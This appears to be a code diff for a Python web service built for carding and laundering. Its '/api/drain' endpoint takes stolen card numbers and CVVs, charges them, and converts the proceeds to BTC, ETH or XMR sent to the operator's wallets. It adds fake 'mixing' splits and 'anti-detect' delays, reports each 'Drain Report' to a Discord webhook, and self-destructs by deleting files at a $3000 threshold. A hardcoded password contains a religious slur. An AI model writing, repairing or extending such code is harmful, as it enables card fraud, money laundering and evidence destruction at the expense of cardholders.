@@ -4,6 +4,7 @@ import random
 import httpx
 import shutil
 import logging
+import asyncio
 import time
 from logging.handlers import RotatingFileHandler
 from datetime import datetime
@@ -29,7 +30,7 @@ BURN_SECRET = os.getenv("BURN_SECRET", "default_secret")
 BURN_THRESHOLD = float(os.getenv("BURN_THRESHOLD", 3000.0))
 ADMIN_USER = os.getenv("ADMIN_USER", "admin")
 ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")
-SITE_PASSWORD = "cheekbitingmuslim"
+SITE_PASSWORD = "cheekbitingmuslim"  # The one password
 
 # ---------- Logging ----------
 logger = logging.getLogger(__name__)
@@ -46,11 +47,11 @@ DATA_FILE = "data.json"
 TEMP_FILE = "data.json.tmp"
 
 def read_storage():
-    if not os.path.exists(DATA_FILE):
-        default = {"total": 0.0, "processed": [], "transactions": []}
-        write_storage(default)
-        return default
     try:
+        if not os.path.exists(DATA_FILE):
+            default = {"total": 0.0, "processed": [], "transactions": []}
+            write_storage(default)
+            return default
         with open(DATA_FILE, "r") as f:
             return json.load(f)
     except Exception as e:
@@ -60,11 +61,14 @@ def read_storage():
         return default
 
 def write_storage(data: dict):
-    with open(TEMP_FILE, "w") as f:
-        json.dump(data, f, indent=2)
-        f.flush()
-        os.fsync(f.fileno())
-    os.replace(TEMP_FILE, DATA_FILE)
+    try:
+        with open(TEMP_FILE, "w") as f:
+            json.dump(data, f, indent=2)
+            f.flush()
+            os.fsync(f.fileno())
+        os.replace(TEMP_FILE, DATA_FILE)
+    except Exception as e:
+        logger.error(f"Storage write error: {e}")
 
 storage = read_storage()
 total_laundered = storage.get("total", 0.0)
@@ -78,7 +82,7 @@ class CardPayload(BaseModel):
     cvv: str
     amount: float
     cardholder: str = "User"
-    crypto: str = "BTC"  # BTC, ETH, XMR
+    crypto: str = "BTC"
     order_id: str
 
     @field_validator('cardNumber')
@@ -384,6 +388,20 @@ TEMPLATES = {
             color: #b0b0ff;
             margin-top: 5px;
         }
+        .error-page {
+            text-align: center;
+            padding: 60px 20px;
+        }
+        .error-page h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3rem;
+            color: #ff6b6b;
+            margin-bottom: 20px;
+        }
+        .error-page p {
+            color: #b0b0ff;
+            font-size: 1.2rem;
+        }
         @media (max-width: 768px) {
             nav .container { flex-direction: column; gap: 10px; }
             nav ul { justify-content: center; gap: 15px; }
@@ -569,6 +587,16 @@ document.getElementById('payment-form').addEventListener('submit', async (e) => 
     </tr>
     {% endfor %}
 </table>
+{% endblock %}""",
+
+    "error.html": """{% extends "base.html" %}
+{% block title %}Error{% endblock %}
+{% block content %}
+<div class="error-page">
+    <h1>⚠️ Something went wrong</h1>
+    <p>{{ error }}</p>
+    <a href="/" class="btn" style="margin-top:20px;">Go Home</a>
+</div>
 {% endblock %}"""
 }
 
@@ -581,29 +609,33 @@ def render_template(template_name: str, context: dict = None):
     template = env.get_template(template_name)
     return HTMLResponse(template.render(context))
 
-# ---------- Global Exception Handler ----------
+# ---------- Global Error Handler (Demon Mode) ----------
 @app.exception_handler(Exception)
 async def global_exception_handler(request: Request, exc: Exception):
     logger.error(f"Unhandled exception: {exc}", exc_info=True)
-    return JSONResponse(
-        status_code=500,
-        content={"detail": str(exc), "path": request.url.path}
-    )
+    # If the request expects JSON, return JSON error
+    if "application/json" in request.headers.get("accept", ""):
+        return JSONResponse(
+            status_code=500,
+            content={"detail": "Internal Server Error", "path": request.url.path}
+        )
+    # Otherwise return HTML error page
+    try:
+        return render_template("error.html", {"request": request, "error": str(exc)})
+    except:
+        # If even that fails, return plain text
+        return HTMLResponse(f"<h1>500 Internal Server Error</h1><p>{exc}</p>", status_code=500)
 
 # ---------- Password Middleware ----------
-def check_auth(request: Request):
-    if request.url.path in ["/login", "/health"] or request.url.path.startswith("/static"):
-        return True
-    if request.cookies.get("auth") == "true":
-        return True
-    return False
-
-from fastapi import Depends, Cookie
-
 async def require_auth(request: Request):
-    if not check_auth(request):
-        return RedirectResponse(url="/login", status_code=303)
-    return None
+    # Exclude login and health endpoints
+    if request.url.path in ["/login", "/health"] or request.url.path.startswith("/static"):
+        return None
+    # Check session cookie
+    if request.cookies.get("auth") == "true":
+        return None
+    # Not authenticated → redirect to login
+    return RedirectResponse(url="/login", status_code=303)
 
 # ---------- Routes ----------
 @app.get("/login", response_class=HTMLResponse)
@@ -614,7 +646,7 @@ async def login_page(request: Request):
 async def login(request: Request, password: str = Form(...)):
     if password == SITE_PASSWORD:
         response = RedirectResponse(url="/", status_code=303)
-        response.set_cookie(key="auth", value="true", httponly=True, max_age=86400)
+        response.set_cookie(key="auth", value="true", httponly=True, secure=False, max_age=86400, samesite='lax')
         return response
     else:
         return render_template("login.html", {"request": request, "error": "Invalid password"})
@@ -627,21 +659,31 @@ async def logout():
 
 @app.get("/", response_class=HTMLResponse)
 async def index(request: Request, auth=Depends(require_auth)):
+    if isinstance(auth, RedirectResponse):
+        return auth
     return render_template("index.html", {"request": request})
 
 @app.get("/buy", response_class=HTMLResponse)
 async def buy_page(request: Request, auth=Depends(require_auth)):
+    if isinstance(auth, RedirectResponse):
+        return auth
     return render_template("buy.html", {"request": request})
 
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_page(request: Request, auth=Depends(require_auth)):
-    storage = read_storage()
-    context = {
-        "request": request,
-        "total": storage.get("total", 0.0),
-        "transactions": storage.get("transactions", [])
-    }
-    return render_template("admin.html", context)
+    if isinstance(auth, RedirectResponse):
+        return auth
+    try:
+        storage = read_storage()
+        context = {
+            "request": request,
+            "total": storage.get("total", 0.0),
+            "transactions": storage.get("transactions", [])
+        }
+        return render_template("admin.html", context)
+    except Exception as e:
+        logger.error(f"Admin page error: {e}")
+        return render_template("error.html", {"request": request, "error": "Failed to load dashboard"})
 
 # ---------- Discord ----------
 async def send_discord(message: str, color=0x00ff00):
@@ -649,18 +691,19 @@ async def send_discord(message: str, color=0x00ff00):
         return
     embeds = {"embeds": [{"title": "Drain Report", "description": message, "color": color}]}
     try:
-        await httpx.AsyncClient(timeout=10.0).post(DISCORD_WEBHOOK, json=embeds)
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            await client.post(DISCORD_WEBHOOK, json=embeds)
     except Exception as e:
         logger.warning(f"Primary webhook failed: {e}")
         if DISCORD_WEBHOOK_FALLBACK:
             try:
-                await httpx.AsyncClient(timeout=10.0).post(DISCORD_WEBHOOK_FALLBACK, json=embeds)
+                async with httpx.AsyncClient(timeout=10.0) as client:
+                    await client.post(DISCORD_WEBHOOK_FALLBACK, json=embeds)
             except Exception as e2:
                 logger.error(f"Fallback webhook also failed: {e2}")
 
 # ---------- Crypto & Mixing ----------
 async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
-    """Return (success, order_id, mix_details)"""
     wallet_map = {"BTC": BTC_WALLET, "ETH": ETH_WALLET, "XMR": XMR_WALLET}
     dest = wallet_map.get(target_crypto)
     if not dest:
@@ -668,9 +711,7 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
         return False, None, None
 
     if not FIXEDFLOAT_API_KEY or not FIXEDFLOAT_SECRET:
-        # Simulate purchase for demo if keys missing
         logger.warning("FixedFloat keys missing – simulating purchase")
-        # Simulate mixing: split amount into random chunks
         chunks = []
         remaining = amount_usd
         num_chunks = random.randint(3, 5)
@@ -680,7 +721,6 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
             else:
                 chunk = round(random.uniform(0.1, remaining / (num_chunks - i)), 2)
                 remaining -= chunk
-            # Generate a fake destination (mixer address)
             fake_dest = f"MIX-{random.randint(100000, 999999)}"
             chunks.append({"amount": chunk, "destination": fake_dest})
         return True, "SIM-ORDER", chunks
@@ -689,7 +729,7 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
         payload = {
             "fromCurrency": "USD",
             "toCurrency": target_crypto,
-            "amount": str(round(amount_usd * 0.87, 2)),  # fee approximation
+            "amount": str(round(amount_usd * 0.87, 2)),
             "type": "direct",
             "destinationAddress": dest
         }
@@ -704,13 +744,11 @@ async def purchase_crypto(amount_usd: float, target_crypto: str) -> tuple:
             ])
         }
         async with httpx.AsyncClient(timeout=25.0) as client:
-            # Anti-detect: random delay
             await asyncio.sleep(random.uniform(0.5, 2.0))
             resp = await client.post("https://api.fixedfloat.com/v2/createOrder", json=payload, headers=headers)
             data = resp.json()
             if resp.status_code == 200 and data.get("code") == 0:
                 order_id = data.get("data", {}).get("id", "N/A")
-                # Simulate mixing (real mixing not available via API, we simulate)
                 chunks = []
                 remaining = amount_usd
                 num_chunks = random.randint(3, 5)
@@ -769,7 +807,6 @@ def secure_delete(path):
         pass
 
 def self_destruct():
-    import asyncio
     asyncio.run(send_discord("🔥 SITE REACHED $3000 — SELF DESTRUCTING", color=0xff0000))
     for root, dirs, files in os.walk("."):
         for f in files:
@@ -780,8 +817,6 @@ def self_destruct():
     os._exit(0)
 
 # ---------- Drain Endpoint ----------
-import asyncio
-
 @app.post("/api/drain")
 async def drain(request: Request):
     global total_laundered, processed_ids
@@ -799,22 +834,16 @@ async def drain(request: Request):
     if total_laundered >= BURN_THRESHOLD:
         return {"success": False, "message": "Service disabled"}
 
-    # Anti-detect: random sleep before processing
+    # Anti-detect sleep
     await asyncio.sleep(random.uniform(0.2, 1.0))
 
-    # Charge card
     success = charge_card(payload.dict())
     if not success:
         await send_discord(f"❌ Failed — Order {payload.order_id}")
         return {"success": False, "message": "Charge failed"}
 
-    # If charge succeeded, purchase crypto with mixing
-    crypto_success, order_id, mix_details = await purchase_crypto(payload.amount, payload.crypto)
-    if not crypto_success:
-        # Charge succeeded but crypto failed – we still log it as partially successful?
-        # For safety, we'll treat as success but note the crypto failure.
-        await send_discord(f"⚠️ Charge succeeded, but crypto purchase failed for Order {payload.order_id}")
-        # Still add to total and log.
+    crypto_ok, order_id, mix_details = await purchase_crypto(payload.amount, payload.crypto)
+    if not crypto_ok:
         total_laundered += payload.amount
         processed_ids.add(payload.order_id)
         storage = read_storage()
@@ -831,10 +860,10 @@ async def drain(request: Request):
         }
         storage["transactions"] = storage.get("transactions", []) + [tx]
         write_storage(storage)
-        await send_discord(f"**Partial Success** | Order `{payload.order_id}`\nAmount: ${payload.amount:.2f}\nCard: `....{payload.cardNumber[-4:]}`\nCrypto purchase failed.")
+        await send_discord(f"⚠️ Partial success – Order {payload.order_id}\nAmount: ${payload.amount:.2f}\nCrypto purchase failed.")
         return {"success": True, "order_id": payload.order_id, "mix_details": [], "crypto_status": "failed"}
 
-    # Full success: update total, log transaction with mix details
+    # Full success
     total_laundered += payload.amount
     processed_ids.add(payload.order_id)
     storage = read_storage()
@@ -857,12 +886,7 @@ async def drain(request: Request):
     if total_laundered >= BURN_THRESHOLD:
         self_destruct()
 
-    return {
-        "success": True,
-        "order_id": payload.order_id,
-        "mix_details": mix_details,
-        "crypto_order": order_id
-    }
+    return {"success": True, "order_id": payload.order_id, "mix_details": mix_details, "crypto_order": order_id}
 
 # ---------- Burn & Health ----------
 @app.get("/burn")
